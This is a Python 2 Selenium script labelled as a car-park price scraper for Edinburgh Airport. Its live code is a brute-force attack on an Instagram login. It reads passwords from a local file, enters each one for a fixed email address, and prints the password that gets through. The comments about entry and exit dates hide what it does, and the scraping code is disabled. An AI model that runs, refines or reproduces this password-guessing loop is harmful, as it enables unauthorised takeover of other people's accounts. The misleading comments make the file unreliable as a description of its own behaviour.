#Web scraper for BCP
#By Jake Gourley
#For Edinburgh Airport
#imports libraries
import cookielib
from selenium import webdriver
from selenium.webdriver.support.ui import Select
import time
from bs4 import BeautifulSoup
import urllib2
import datetime
from datetime import date
from datetime import timedelta
import pandas as pd
import ssl
from selenium.webdriver.common.proxy import Proxy, ProxyType

c = 2
proxList = open("C:\Users\Jake\Downloads\chromedriver_win32 (1)\Proxy List.txt", 'r')
fileOpen = open("C:\Users\Jake\Downloads\chromedriver_win32 (1)\Passwords.txt", 'r')
# Using Chrome to access web
while c == 2:
    myProxy = proxList.readline()

    proxy = Proxy({
        'proxyType': ProxyType.MANUAL,
        'httpProxy': myProxy,
        'ftpProxy': myProxy,
        'sslProxy': myProxy,
        'noProxy': '' # set this value as desired
        })
    driver = webdriver.Chrome("C:\Users\Jake\Downloads\chromedriver_win32 (1)\chromedriver.exe")
    # Open the website
    driver.get('https://www.instagram.com/accounts/login/?source=auth_switcher')
    time.sleep(2)
    print("ready")
    
    password = fileOpen.readline()
    #selects the entry date element
    entryDate = driver.find_element_by_name("username")
    #clicks the element specified
    entryDate.click()
    #clear the text box
    entryDate.clear()
    #enters the entry date
    entryDate.send_keys("gez@gourley1.co.uk")
    time.sleep(2)
    #clicks the lement again to close the calendar prompt
    entryDate.click()


    #selects the exit date element
    exitDay = driver.find_element_by_name("password")
    #clicks the element specified
    exitDay.click()
    #clear the text box
    exitDay.clear()
    #enters the entry date
    exitDay.send_keys(password)
    time.sleep(2)
    #clicks the lement again to close the calendar prompt
    exitDay.click()

    time.sleep(3)
    #finds the search button element
    SearchButton = driver.find_element_by_xpath("//*[contains(@type, 'submit')]")
    #clicks the search button
    SearchButton.click()

    time.sleep(3)
    #sets url to current url
    url= driver.current_url

    if url == "https://www.instagram.com/":
        print("program finsihed: ", password)
        c = c + 1
    else:
        driver.close()
"""
    #sets the array counter
    i = 1

    #opens the url
    ssl._create_default_https_context = ssl._create_unverified_context
    innerHtml = driver.execute_script("return document.body.innerHTML")

    #reads the url
    soup = BeautifulSoup(innerHtml, 'lxml')


    #sets date and time
    d = datetime.datetime.today()
    Date = str(Date)
    Exit = str(exit_Date)
    D = str(d)
    with open ('Airparks.csv', 'a') as file:
        file.write(Date)
        file.write(",")
        file.write(Exit)
        file.write(",")
        file.write(D)
        file.write(",")
    #counter
    i=0
    strongArray = soup.find_all("h4")
    counter = len(strongArray)
    #checks whether end of strong tags has been reached
    while counter != i:
        #sets h2 value
        h2 = soup.find_all("div", {"class": "m-0 h1"}) [i]

        #sets strong value
        strong = soup.find_all("h4")[i]
    
        #prints h2 (text)
        print(strong).text
        print(h2).text
        #prints strong (text)
        #sets h2T
        h2T = h2.text
    
        #sets strongT
        strongT = strong.text
    
        #opens file
        with open ('Airparks.csv', 'a') as file:
            
            #writes to file
            file.write(strongT.encode('utf-8'))
            file.write(",")
            file.write(h2T.encode('utf-8'))
            file.write(",")


        #adds one to counter
        i = i + 1
    with open ('Airparks.csv', 'a') as file:
        file.write("\n")
    f = f +1
    driver.close()
    """
print("end of program")
